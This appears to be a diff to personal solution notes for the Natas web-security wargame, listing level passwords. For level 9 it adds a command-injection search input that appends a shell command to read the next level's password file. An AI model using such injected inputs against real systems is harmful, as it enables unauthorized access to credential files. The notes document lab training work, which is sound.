@@ -42,5 +42,10 @@
 #pwd: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
 
 #9
-
+# PHP injection
+# search for '& cat /etc/natas_webpass/natas10'
 #pwd: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+#10
+
+#pwd: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
